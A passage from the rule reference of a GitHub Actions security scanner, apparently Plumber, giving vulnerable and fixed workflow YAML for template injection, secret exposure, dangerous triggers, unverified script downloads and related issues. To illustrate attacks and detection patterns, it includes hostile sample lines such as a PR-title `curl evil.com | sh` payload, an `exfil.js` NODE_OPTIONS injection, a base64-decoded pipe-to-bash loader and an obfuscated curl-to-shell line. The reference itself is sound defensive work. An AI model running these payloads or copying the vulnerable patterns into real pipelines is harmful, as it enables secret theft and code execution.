reads as an insider instead, held at the Medium ceiling.

---

## ISSUE-716 — `action-source-unverifiable`

**Severity:** `low` • **Control:** `actionsMustNotExecuteMutableRemoteCode`

Plumber could not fetch the action's own source (network error, API rate
limit, GitHub Enterprise Server host, private repo, or a Docker-image
action) so it could not confirm whether the action fetches mutable remote
code at runtime.

This is surfaced as an explicit could-not-verify finding rather than a
silent pass. A silent pass would let the same repository score differently
across CI environments and would over-claim safety on an unchecked
dependency.

Re-run where the action source is reachable (authenticated token, network
access) for a definitive result, or vendor the action so its source is
local and auditable. The finding is informational: it flags an unchecked
dependency, not a confirmed problem. Note that `--fail-warnings` turns
could-not-verify results into exit code 3.

First-party `actions/*` and `github/*` are never source-scanned.

---

## ISSUE-207 — `template-injection`

**Severity:** `critical` • **Control:** `workflowMustNotInjectUserInputInScripts`

A `run:` shell script interpolates an attacker-controlled **free-text**
`github` field directly. The expression value is pasted in by GitHub
**before** the shell parses the command, so a PR title crafted as
`"; curl evil.com | sh #` becomes a shell command with the base repo's
secrets.

The check fires only on the genuinely injectable subfields — the ones a
PR author, issue/comment author, or fork owner controls as free text:

- titles and bodies (`*.title`, `*.body` on issue / pull_request /
  comment / review / discussion)
- branch / ref names (`github.head_ref`, `head.ref`, `head.label`,
  `head_branch`, `default_branch`)
- commit messages (`*.message`)
- repository metadata on the attacker's fork (`*.description`,
  `*.homepage`)
- author / committer identity (`author.name`, `author.email`,
  `committer.name`, `committer.email`)
- GitHub Pages page names (`page_name`)

Numeric, boolean, enum and SHA fields (`pull_request.number`,
`*.commits`, `head.repo.fork`, `event_name`, `author_association`,
`*.sha`, `github.repository`) are deliberately **not** flagged — they
cannot carry an injection payload, and flagging them drowns the real
signal in false positives.

```yaml
# ❌ before — PR title is pasted straight into the shell
- run: echo "Title is ${{ github.event.pull_request.title }}"
```

```yaml
# ✅ after — env: binding, shell expansion quotes the value
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title is $TITLE"
```

---

## ISSUE-208 — `insecure-commands`

**Severity:** `high` • **Control:** `workflowMustNotReEnableInsecureCommands`

`ACTIONS_ALLOW_UNSECURE_COMMANDS: true` re-enables the deprecated
`::set-env::` / `::add-path::` workflow commands disabled after
CVE-2020-15228. Any log line the attacker can influence rewrites the
running job's environment and PATH.

```yaml
# ❌ before
jobs:
  build:
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
    steps:
      - run: echo "::set-env name=PATH::/opt/attack:$PATH"
```

```yaml
# ✅ after — validated writes through $GITHUB_ENV / $GITHUB_PATH
jobs:
  build:
    steps:
      - run: echo "BUILD_MODE=release" >> "$GITHUB_ENV"
```

---

## ISSUE-209 — `github-env-injection`

**Severity:** `high` • **Control:** `workflowMustNotWriteUntrustedContentToGitHubEnv`

Attacker-controlled content reaches `$GITHUB_ENV` or `$GITHUB_PATH`.
Those files are sticky: every following step inherits the variables and
PATH entries they define. Injecting `NODE_OPTIONS=--require=./exfil.js`
hijacks every later Node invocation; front-loading a directory onto
`$GITHUB_PATH` shadows a real binary. Two shapes are flagged.

**Direct.** The untrusted expression and the redirect are on the same
`run:` line.

```yaml
# ❌ before
- run: echo "PR_TITLE=${{ github.event.pull_request.title }}" >> "$GITHUB_ENV"
```

```yaml
# ✅ after — env: binding keeps the template off the redirect line
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR_TITLE=$TITLE" >> "$GITHUB_ENV"
```

**Env-bound.** This is the case [ISSUE-207](#issue-207--template-injection)
cannot see: the `env:` binding shell-escapes the value, so there is no
command injection, but it does not stop env / PATH poisoning. Binding
does **not** make these safe:

- a multiline value (`*.body`, `*.message`) written to `$GITHUB_ENV` —
  the newline survives the variable and opens a second `KEY=value` line;
- **any** controlled value written to `$GITHUB_PATH` — the value is a
  directory the attacker can plant a binary in.

```yaml
# ❌ before — env: binding does NOT protect these
- env:
    BODY: ${{ github.event.issue.body }}
  run: echo "NOTE=$BODY" >> "$GITHUB_ENV"     # newline opens a 2nd var
- env:
    REF: ${{ github.head_ref }}
  run: echo "$REF" >> "$GITHUB_PATH"          # attacker-named PATH dir
```

```yaml
# ✅ after — neutralise the newline (base64 / toJSON) or pin the value
- env:
    BODY: ${{ github.event.issue.body }}
  run: echo "NOTE=$(printf '%s' "$BODY" | base64 -w0)" >> "$GITHUB_ENV"
- run: echo "/opt/tools/bin" >> "$GITHUB_PATH"   # not attacker-derived
```

A single-line value (title, ref) written to `$GITHUB_ENV` stays silent:
with no newline it cannot open a second variable line. `toJSON(...)`
also neutralises the newline and stays silent.

---

## ISSUE-210 — `bot-conditions`

**Severity:** `high` • **Control:** `workflowMustNotTrustSpoofableActorChecks`

An `if:` guard tests `github.actor`, `github.triggering_actor`,
`github.event.sender.login`, etc. Those fields reflect whoever opened
the PR — spoofable by a fork with a crafted login. The gate the
author believes is in place does not stop a determined attacker.

```yaml
# ❌ before — spoofable bot check
jobs:
  auto-merge:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    steps:
      - run: gh pr merge --auto --squash "$PR_URL"
```

```yaml
# ✅ after — environment-gated approval path
jobs:
  auto-merge:
    environment: dependabot-auto-merge   # required reviewers on the env
    runs-on: ubuntu-latest
    steps:
      - run: gh pr merge --auto --squash "$PR_URL"
```

---

## ISSUE-211 — `unsound-condition`

**Severity:** `medium` • **Control:** `workflowConditionsMustBeSound`

A tautology (`always() || …`, `true == true`) or a contradiction
(`false && …`) in an `if:`. The gate the author thought they installed
is silently absent — the job runs unconditionally (tautology) or never
(contradiction).

```yaml
# ❌ before — always() short-circuits the OR
jobs:
  deploy:
    if: always() || github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

```yaml
# ✅ after — the actual gate
jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

---

## ISSUE-212 — `unsound-contains`

**Severity:** `medium` • **Control:** `workflowContainsCallsMustBeSound`

`contains(literal, expression)` inverts the built-in's signature.
`contains('main', github.ref)` never matches because `'main'` does not
contain `refs/heads/main` — the gate stays closed while the reviewer
reads the reverse.

```yaml
# ❌ before
if: contains('main', github.ref)
```

```yaml
# ✅ after — haystack first, needle second
if: contains(github.ref, 'refs/heads/main')

# ✅✅ explicit allow-list — clearest
if: contains(fromJSON('["main", "release"]'), github.ref_name)
```

---

## ISSUE-213 — `unsafe-github-context-dump`

**Severity:** `high` • **Control:** `workflowMustNotExportEntireGitHubContext`

A `run:` script, env binding or action input serialises the whole
`github` context (or `github.event`) via `toJson(...)`. The
resulting JSON carries every user-controllable field GitHub exposes
— PR title, issue body, fork branch name, commit message —
bundled together. A single `echo $JSON` downstream leaks the full
attack surface, and passing the blob to a third-party action hands
it the same surface as input.

```yaml
# ❌ before — every github.event field ends up in PAYLOAD
jobs:
  report:
    env:
      PAYLOAD: ${{ toJson(github.event) }}
    steps:
      - run: echo "$PAYLOAD" > /tmp/event.json
```

```yaml
# ✅ after — name the specific fields you need
jobs:
  report:
    env:
      PR_NUMBER: ${{ github.event.pull_request.number }}
      PR_AUTHOR: ${{ github.event.pull_request.user.login }}
    steps:
      - run: jq -n --arg n "$PR_NUMBER" --arg a "$PR_AUTHOR" '{number:$n,author:$a}' > /tmp/event.json
```

Same risk class as ISSUE-207 template-injection, but the dump form
is worse: one line leaks the whole field set rather than one
field.

---

## ISSUE-214 — `unpinned-package-install`

**Severity:** `medium` • **Control:** `workflowMustPinPackageInstalls`

A `run:` step invokes `pip install PKG` or `npm install PKG`
without pinning a version and without a lockfile install. Every
run then resolves whatever is latest on the registry at execution
time — a window exploited repeatedly by typosquat and maintainer-
account compromise attacks.

```yaml
# ❌ before
- run: pip install requests
- run: npm install react
```

```yaml
# ✅ after — lockfile install + inline pin where needed
- run: pip install -r requirements.txt
- run: npm ci
- run: pip install 'pytest==8.3.3'
- run: npm install react@18.3.1
```

Lockfile-based installs (`npm ci`, `pip install -r requirements.txt --require-hashes`)
combine with Dependabot to keep runs reproducible AND fresh.

---

## ISSUE-215 — `template-injection-vars`

**Severity:** `low` • **Control:** `workflowMustNotInjectVarsInScripts`

Same shape as ISSUE-207 template-injection but sourced from
maintainer-adjacent values rather than PR-author input. Three kinds
are flagged:

- `${{ vars.* }}` — repo / org / environment variables set by
  maintainers. Exploitable on a compromised maintainer account or a
  misconfigured org-level variable.
- `${{ inputs.* }}` — inputs to a reusable workflow. When the
  caller proxies `github.event.*` into an input, the surface flips
  to PR-author-controlled.
- `${{ github.event.inputs.* }}` — the legacy spelling of the same
  input context. Matched separately because the `github.event.`
  prefix sits between `${{` and `inputs.`, so the pattern above
  never reaches it.

The trigger does not change the verdict. A `workflow_dispatch`-only
workflow is flagged like any other: `${{ inputs.x }}` and
`${{ github.event.inputs.x }}` are the same value written two ways,
and exempting one spelling would give a single input two verdicts.
The control is a low-severity hygiene check, not a claim that the
value is attacker-controlled — that is ISSUE-207's job.

```yaml
# ❌ before
- run: docker login ${{ vars.REGISTRY }} -u admin -p ${{ secrets.TOKEN }}
```

```yaml
# ✅ after — env binding quotes the value automatically
- env:
    REGISTRY: ${{ vars.REGISTRY }}
    TOKEN: ${{ secrets.TOKEN }}
  run: docker login "$REGISTRY" -u admin -p "$TOKEN"
```

```yaml
# ❌ before — reusable workflow input pasted into a shell
- run: make ${{ inputs.test-command }}

# ✅ after — binding via env:
- env:
    TEST_CMD: ${{ inputs.test-command }}
  run: make "$TEST_CMD"
```

---

## ISSUE-309 — `overprovisioned-secrets`

**Severity:** `critical` • **Control:** `workflowMustNotExportEntireSecretsContext`

`toJson(secrets)` or `toJSON(secrets)` serialises the entire secrets
context into a string and passes it to a step's script, env binding,
or action `with:` input. Every downstream consumer (log, third-party
action, HTTP header) sees the full stock.

```yaml
# ❌ before — every secret ends up in SECRETS_JSON
jobs:
  call:
    env:
      SECRETS_JSON: ${{ toJson(secrets) }}
    steps:
      - run: echo "$SECRETS_JSON" | ./upload
```

```yaml
# ✅ after — one env binding per secret
jobs:
  call:
    steps:
      - env:
          API_TOKEN: ${{ secrets.API_TOKEN }}
        run: ./upload
```

---

## ISSUE-302 — `secrets-inherit`

**Severity:** `high` • **Control:** `reusableWorkflowsMustNotInheritSecrets`

A reusable-workflow call with `secrets: inherit` forwards every secret
visible to the caller. A compromise of the callee — upstream account,
malicious PR merged on the reusable side, tag retag — then sees the
full secret surface of every caller.

```yaml
# ❌ before
jobs:
  call:
    uses: org/shared/.github/workflows/publish.yml@v1
    secrets: inherit
```

```yaml
# ✅ after — explicit per-secret mapping
jobs:
  call:
    uses: org/shared/.github/workflows/publish.yml@v1
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

---

## ISSUE-303 — `unredacted-secrets`

**Severity:** `high` • **Control:** `workflowMustNotUnredactSecretsViaFromJSON`

`fromJSON(secrets.X).y` defeats GitHub's automatic log redaction.
Redaction works on the known-secret value; once `fromJSON` parses the
blob, the sub-fields are fresh strings the runtime never saw, so any
later echo leaks them in plain text.

```yaml
# ❌ before — .token bypasses redaction once fromJSON runs
jobs:
  deploy:
    env:
      API_TOKEN: ${{ fromJSON(secrets.CREDS).token }}
    steps:
      - run: echo "token=$API_TOKEN" >> deploy.log
```

```yaml
# ✅ after — split the structured secret, store each leaf separately
jobs:
  deploy:
    env:
      API_TOKEN: ${{ secrets.API_TOKEN }}
    steps:
      - run: echo "token=$API_TOKEN" >> deploy.log
```

---

## ISSUE-801 — `undocumented-permissions`

**Severity:** `medium` • **Control:** `workflowsMustDeclarePermissions`

Neither the workflow nor any job declares a `permissions:` block. The
runner inherits the repository-wide default GITHUB_TOKEN scope —
often `contents: write` or `read-all`. Every step gets more authority
than it needs; any compromise escalates with that larger scope.

```yaml
# ❌ before — inherits the repo default
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make build
```

```yaml
# ✅ after — least-privilege declaration
name: Build
on: [push]
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make build
```

---

## ISSUE-305 — `secrets-outside-env`

**Severity:** `medium` • **Control:** `deployJobsMustUseEnvironmentGate`

A deploy / publish job (trigger `release` or a canonical publish
action) reads secrets without an `environment:` gate. Environments are
the GitHub hook for required reviewers, wait timers, and deployment
branch rules — without one, the trigger leads straight to the secret.

```yaml
# ❌ before — no environment, no reviewer in the loop
name: Publish
on: [release]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: twine upload --password ${{ secrets.PYPI_TOKEN }} dist/*
```

```yaml
# ✅ after — environment: production with reviewers configured on it
name: Publish
on: [release]
jobs:
  publish:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: twine upload --password ${{ secrets.PYPI_TOKEN }} dist/*
```

---

## ISSUE-306 — `github-app-skip-revoke`

**Severity:** `high` • **Control:** `githubAppTokensMustBeRevokedOnExit`

A step mints a GitHub App installation token with
`skip-token-revoke: true`. The token survives the run and becomes a
long-lived credential — any later leak (log, artefact, restored cache)
stays exploitable instead of meeting a revoked token.

```yaml
# ❌ before
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    skip-token-revoke: true
```

```yaml
# ✅ after — default behaviour revokes on exit
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
```

---

## ISSUE-307 — `artipacked`

**Severity:** `low` • **Control:** `checkoutMustNotPersistCredentials`

`actions/checkout` writes the GITHUB_TOKEN into the cloned repo's
`.git/config` by default. On its own that is latent hygiene: the token
is discarded when the job ends. It becomes a demonstrable leak only
when a later step packs `.git` into an uploaded artifact (escalated to
[ISSUE-310](#issue-310--artipacked-exfiltrated)) or when fork-controlled
code runs in the job (covered by ISSUE-802 / ISSUE-804). This low-tier
finding is a heads-up to add the one-liner.

```yaml
# ❌ before — token persisted
- uses: actions/checkout@v4
```

```yaml
# ✅ after — disable credential persistence
- uses: actions/checkout@v4
  with:
    persist-credentials: false
```

---

## ISSUE-310 — `artipacked-exfiltrated`

**Severity:** `high` • **Control:** `checkoutMustNotPersistCredentials`

A checkout persists the GITHUB_TOKEN **and** a later
`actions/upload-artifact` uploads a `.git`-inclusive path (the
workspace root, `.`, or a path naming `.git`). The token is packed
into the artifact, which is downloadable — anonymously, on public
repos — so it is exfiltrable. This is the canonical, demonstrable
ArtiPACKED leak, so it escalates from the latent
[ISSUE-307](#issue-307--artipacked) hygiene tier to a real exposure.

```yaml
# ❌ before — persisted token packed into the artifact
- uses: actions/checkout@v4
- uses: actions/upload-artifact@v4
  with:
    path: .            # includes .git/, and .git/config holds the token
```

```yaml
# ✅ after — disable persistence, or upload a scoped path
- uses: actions/checkout@v4
  with:
    persist-credentials: false
- uses: actions/upload-artifact@v4
  with:
    path: dist/        # excludes .git/
```

---

## ISSUE-308 — `secrets-dynamic-index`

**Severity:** `low` • **Control:** `workflowMustNotIndexSecretsDynamically`

A workflow reads `${{ secrets[expr] }}` where `expr` is not a
quoted literal — typically an `env.VAR_NAME`, `inputs.*`,
`matrix.*`, or a computed expression. The bracket form defers the
secret name resolution to runtime, which effectively hands read
access to every secret the job can see to whatever drives `expr`.
A later refactor that threads a template expression through the
index silently promotes the weakness.

```yaml
# ❌ before — which secret is read depends on an env binding
jobs:
  e2e:
    env:
      OSC_ACCESS_KEY_NAME: PROD_AK
    steps:
      - env:
          OSC_ACCESS_KEY: ${{ secrets[env.OSC_ACCESS_KEY_NAME] }}
        run: ./run-e2e.sh
```

```yaml
# ✅ after — secret named directly, grant surface explicit
jobs:
  e2e:
    steps:
      - env:
          OSC_ACCESS_KEY: ${{ secrets.PROD_AK }}
        run: ./run-e2e.sh
```

When a matrix genuinely needs to choose among N secrets, split the
job into N jobs with static names — the verbosity is worth the
reviewability.

---

## ISSUE-301 — RETIRED

**Control:** `pipelineMustNotLeakSecretsInConfig` (removed)

The gitleaks-based secret scanning integration was removed in
[#310](https://github.com/getplumber/plumber/issues/310) — secret
detection is out of scope for Plumber and the integration meant
shelling out to an external binary; see security advisory
[GHSA-w2xj-4v44-6rqr](https://github.com/getplumber/plumber/security/advisories/GHSA-w2xj-4v44-6rqr).
The ISSUE-301 slot is retired
and must never be reused: the downstream jobs platform has mapped
"secret leak in pipeline configuration" to 301 since before the CLI
rule existed. Configs still carrying the control key get a
"removed and ignored" warning.

---

## ISSUE-411 — `unverified-scripts`

**Severity:** `high` • **Control:** `pipelineMustNotExecuteUnverifiedScripts`

A `run:` step downloads or inline-executes code without any integrity
check. Maps to OWASP CICD-SEC-3 (Dependency Chain Abuse) and CICD-SEC-8
(Ungoverned Usage of 3rd Party Services). The October 2025 Megalodon
mass-backdooring campaign (SafeDep) was the operational version of
this risk class: workflows that ran an obfuscated payload via
`echo "<base64>" | base64 -d | bash`.

### Detected patterns

The rule fires on any of these on a single script line:

```yaml
# Pipe curl|wget straight into a shell
- run: curl -sSL https://example.com/install.sh | bash
- run: wget -qO- https://example.com/install.sh | sh

# Download then execute
- run: curl -fsSL https://example.com/install.sh -o install.sh && bash install.sh

# Redirect to a file then execute
- run: curl -fsSL https://example.com/payload.sh > install.sh; sh install.sh

# Megalodon-style inline payload (the CVE pattern)
- run: echo "Q0I9Imh0dHA6Ly8yMTYuMTI2LjIyNS4xMjk6ODQ0MyI=" | base64 -d | bash

# Generic <cmd> | <shell>
- run: cat /tmp/payload.sh | sh

# Heredoc-as-camouflage on a download (still fires — the heredoc
# does not shield a remote pipe-to-shell on the same line)
- run: curl https://evil.example.com/payload | bash <<EOF
```

### Silent on legitimate patterns

False-positive guards keep the signal sharp:

```yaml
# Pipe-to-shell substring inside a quoted string — documentation, not execution
- run: echo "Install with curl https://example.com/install.sh | bash"

# Heredoc-to-shell with no download on the line — operator-authored,
# in-tree content; any unsafe download in the body still fires on its
# own script line
- run: |
    cat <<'EOF' | bash
    echo "verified, in-tree content"
    EOF

# Leading echo/printf piping in-workflow data into an interpreter —
# local data, not a download (issue #236). Voided when curl/wget/base64
# is also on the line, so the Megalodon chain above still fires.
- run: echo "$NEEDS_CONTEXT" | python3 -c 'import json, sys; print(json.load(sys.stdin))'

# Innocent pipes (no shell target)
- run: echo hello | wc -l
- run: ls | grep foo
- run: cat README.md | head -n 5
```

### Exempted via integrity check on the same line

A verification command anywhere on the same line as the download
exempts the line. Recognised: `sha256sum` / `sha512sum` / `sha1sum` /
`shasum`, `gpg --verify`, `cosign verify` / `cosign verify-blob`.

```yaml
# ✅ checksum
- run: curl -sSL https://example.com/install.sh -o install.sh && sha256sum -c install.sha256 && bash install.sh

# ✅ signature
- run: curl -sSL https://example.com/install.sh -o install.sh && gpg --verify install.sh.sig install.sh && bash install.sh

# ✅ cosign
- run: curl -sSL https://example.com/install.sh -o install.sh && cosign verify-blob --signature install.sig install.sh && bash install.sh
```

The verification check itself is quote-aware: a keyword inside a
string (`echo "should sha256sum first" && curl evil | bash`) does NOT
exempt the line — only a real verification command on the unquoted
part of the line does.

### Exempted via trusted URL

```yaml
# ❌ before
- run: curl -sSL https://internal-artifacts.example.com/install.sh | bash
```

```yaml
# ✅ after — declare the host in .plumber.yaml
# github:
#   controls:
#     pipelineMustNotExecuteUnverifiedScripts:
#       enabled: true
#       trustedUrls:
#         - https://internal-artifacts.example.com/*
- run: curl -sSL https://internal-artifacts.example.com/install.sh | bash
```

`trustedUrls` matches via glob and is host-precise:
`https://example.com/*` exempts `example.com/...` but never bleeds
into `evil.example.com/...`.

A fetch from the scanned repository's own domain reads as a
first-party source: an insider who can change it, held at the Medium
ceiling, never the outsider wording a stranger's host gets. A fetch
pinned to the exact commit the workflow itself runs at is an
immutable self-reference instead, no dependency at all: the only
party who could ever change it already committed here. The same
fetch pinned to a branch or tag name, rather than a commit, is not
immutable and falls back to the first-party reading above.

### Canonical fix

```yaml
# ❌ before
- run: curl -sSL https://example.com/install.sh | bash

# ✅ after — vendored script + lockfile-style install
- run: bash scripts/setup.sh
- run: |
    curl -sSL https://example.com/install.sh -o install.sh
    echo "<expected-sha256>  install.sh" | sha256sum -c -
    bash install.sh
```

---

## ISSUE-802 — `dangerous-triggers`

**Severity:** `critical` • **Control:** `workflowMustNotUseDangerousTriggers`

A job runs under a trigger that combines attacker-controlled input with
the base repository's secrets — `workflow_run`, `issue_comment`,
`pull_request_review`, `pull_request_review_comment`, `discussion`,
`discussion_comment`, `gollum`, `fork` — **and checks out fork-controlled
code** (an `actions/checkout` whose `ref:` is the PR or workflow_run
head). Untrusted code then executes with the base repo's secrets and
token — the same exploit class as the March 2025 tj-actions compromise
(CVE-2025-30066).

The `pull_request_target` case is covered by [ISSUE-804](#issue-804--pull-request-target-with-head-checkout)
(`pullRequestTargetMustNotCheckoutHead`) — same exploit class, dedicated
rule, no double-firing.

Subscribing to such a trigger is **not** flagged on its own: metadata
jobs — labelling, milestones, comments, notifications — legitimately
need them and are safe without an untrusted checkout. The finding fires
only on the exploitable combination, and abstains when a job-level `if:`
restricts execution to same-repository pull requests.

```yaml
# ❌ before — workflow_run checks out the PR head from a chained workflow
on:
  workflow_run:
    workflows: ["lint"]
    types: [completed]
jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.workflow_run.head_sha }}
      - run: npm install && npm test
```

```yaml
# ✅ after — same-repository guard: fork code never runs
jobs:
  preview:
    if: github.event.workflow_run.head_repository.full_name == github.repository
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.workflow_run.head_sha }}
      - run: npm install && npm test
```

Alternative: drop the head checkout entirely and let the job operate
only on the base repo's content.

A job the rule flags behind a label or another maintainer action
still anchors a path, but at the High ceiling, Medium instead when
the checkout also only ever pulls the commit the maintainer
approved: the gate narrows who gets in, it does not clear the finding.

---

## ISSUE-804 — `pull-request-target-with-head-checkout`

**Severity:** `critical` • **Control:** `pullRequestTargetMustNotCheckoutHead`

`pull_request_target` AND an explicit checkout of the PR head
(`github.event.pull_request.head.sha`, `github.head_ref`). Base-repo
secrets plus fork-controlled code in the same run: the exact vector
of CVE-2025-30066.

```yaml
# ❌ before — the literal tj-actions pattern
name: Preview
on: [pull_request_target]
jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
```

```yaml
# ✅ after — split trigger: metadata under pull_request_target,
#            fork code under a plain pull_request handoff
name: Preview — metadata
on: [pull_request_target]
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4     # base repo, no ref: override
      - run: gh pr edit --add-label auto-preview
```

A job-level `if:` that restricts the job to same-repository pull
requests — `github.event.pull_request.head.repo.full_name ==
github.repository`, or a `head.repo.fork` check — is recognised as a
valid mitigation: fork-controlled code never runs, so a job carrying
such a guard is not flagged.

A job this rule still flags, gated behind a label or another
maintainer action, holds its attack path at the High ceiling instead
of Critical, Medium when the job also only ever checks out the
commit the maintainer approved.

---

## ISSUE-803 — `excessive-permissions`

**Severity:** `high` • **Control:** `workflowMustNotGrantPermissionsWriteAll`

`permissions: write-all` grants the GITHUB_TOKEN write access to every
API scope. Any compromise (unpinned action, injection, cache poisoning)
then escalates to full repository control.

```yaml
# ❌ before — blanket write-all
permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps: [ { run: make build } ]
```

```yaml
# ✅ after — narrowest scope, widened per job when needed
permissions:
  contents: read
jobs:
  comment-pr:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write   # only the job that needs it
    steps: [ { run: gh pr comment ... } ]
```

---

## ISSUE-422 — `anonymous-definition`

**Severity:** `low` • **Control:** `workflowsMustHaveExplicitName`

No top-level `name:`. GitHub falls back to the file path in the Actions
UI, PR checks, required-status-check rules and the audit log. A rename
silently breaks the required-status-check binding that referenced the
old path.

```yaml
# ❌ before
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps: [ { run: make build } ]
```

```yaml
# ✅ after — stable identifier
name: Build and Test
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps: [ { run: make build } ]
```

---

## ISSUE-423: `invalid-workflow`

**Severity:** `low` • **Control:** `workflowsMustBeValid`

A file under `.github/workflows` cannot be parsed as a workflow by
Plumber's own parser: an undefined YAML anchor, a tab-indented block, a
duplicate key, a syntax error. GitHub shows a workflow file it cannot
read as invalid on the Actions tab and does not run it, so whatever
that workflow was meant to do never happens, and nothing else in the
repository notices.

Out of scope: an empty file and a file with no `jobs:` block parse fine
as YAML but still produce nothing GitHub will run; this control does
not flag them, only a file its own parser refuses outright. It also
does not repeat GitHub's own schema validation, so a file that is
well-formed YAML but that GitHub still rejects is not flagged: a job
without `runs-on`, an unterminated `${{ }}` expression, a `needs:`
naming a job that does not exist. The Actions tab, or a linter such as
actionlint, reports those.

```yaml
# ❌ before: the alias has no matching anchor in this file
name: Anchor Aliases
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
        with: *checkout_with
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
        with: *checkout_with
```

```yaml
# ✅ after: the anchor is defined in the same file before it is used
name: Anchor Aliases
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
        with: &checkout_with
          persist-credentials: false
          fetch-depth: 0
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
        with: *checkout_with
```

**Remediation:** open the Actions tab and read the error GitHub reports
for the file; for an undefined anchor, define it in the same file
before using it (GitHub Actions resolves YAML anchors only within one
file, never across included or reusable workflows), or inline the block
instead of aliasing it. Confirm the workflow appears without the
invalid-workflow banner once fixed.

---

## ISSUE-418 — `missing-concurrency`

**Severity:** `medium` • **Control:** `workflowsMustDeclareConcurrency`

No `concurrency:` block at either workflow or job level. Concurrent
triggers on the same ref (rebases, force-pushes, retries) race on
caches, artefacts, deploy targets. On a deploy workflow an older run
can even overtake a newer one and land stale output.

```yaml
# ❌ before
name: Deploy
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

```yaml
# ✅ after — concurrency group scoped by workflow+ref
name: Deploy
on: [push]
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true   # set false for production deploys
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

---

## ISSUE-419 — `workflow-misfeature`

**Severity:** `medium` • **Control:** `workflowMustNotUseKnownMisfeatures`

`actions/upload-artifact` with `path: .` or
`path: ${{ github.workspace }}` uploads the whole checkout — including
`.git/`. Paired with ISSUE-307 (artipacked) this exfiltrates the
GITHUB_TOKEN; even alone it leaks the full git history.

```yaml
# ❌ before
- uses: actions/upload-artifact@v4
  with:
    name: workspace
    path: .
```

```yaml
# ✅ after — upload the build output, nothing else
- uses: actions/upload-artifact@v4
  with:
    name: binaries
    path: dist/
```

---

## ISSUE-420 — `workflow-obfuscation`

**Severity:** `high` • **Control:** `workflowMustNotContainObfuscation`

The workflow carries invisible Unicode (zero-width spaces U+200B–U+200F,
bidi overrides U+202A–U+202E, BOM U+FEFF) inside a script, env value or
action input. The source looks harmless in review while the runner
executes a different instruction. This is the **Trojan Source**
attack class (CVE-2021-42574), documented against npm / PyPI packages
since 2021.

```yaml
# ❌ before — zero-width space between "curl" and the URL
#            (not visible, but the runner sees it)
- run: curl​https://evil.example/payload.sh | sh
```

```yaml
# ✅ after — pure ASCII, pinned fetch, verified checksum
- run: |
    curl -fsSL -o /tmp/payload.sh https://trusted.example/payload.sh
    echo "<expected-sha256>  /tmp/payload.sh" | sha256sum -c -
    bash /tmp/payload.sh
```

A pre-commit hook refusing zero-width / bidi Unicode in source files is
the sustainable fix.

---

## ISSUE-421 — `use-trusted-publishing`

**Severity:** `high` • **Control:** `publishWorkflowsMustUseOidcTrustedPublishing`

Publish to PyPI / npm / Maven Central uses a long-lived static token
instead of OIDC trusted publishing. Static tokens are reusable from
anywhere they leak; OIDC tokens are short-lived, scoped to a specific
repo / workflow / environment.

```yaml
# ❌ before — static token
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: python -m build
      - uses: pypa/gh-action-pypi-publish@v1
        with:
          password: ${{ secrets.PYPI_API_TOKEN }}
```

```yaml
# ✅ after — OIDC, no password: input
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write       # required for OIDC
      contents: read
    steps:
      - uses: actions/checkout@v4
      - run: python -m build
      - uses: pypa/gh-action-pypi-publish@v1
```

Configure the matching *trusted publisher* on PyPI project settings
(for npm, use `--provenance`; for Maven Central, the Sonatype portal's
trusted publishing flow).

---

## ISSUE-901 — `dependabot-insecure-exec`

**Severity:** `critical` • **Control:** `dependabotMustNotAllowInsecureExternalCodeExecution`

`.github/dependabot.yml` sets `insecure-external-code-execution: allow`
for an ecosystem. Dependabot then runs install / postinstall hooks
from every candidate version during resolution, giving any compromised
upstream package direct code execution inside the privileged Dependabot
runner.

```yaml
# ❌ before
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: daily }
    insecure-external-code-execution: allow
```

```yaml
# ✅ after — default (deny) is the correct value
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: daily }
```

---

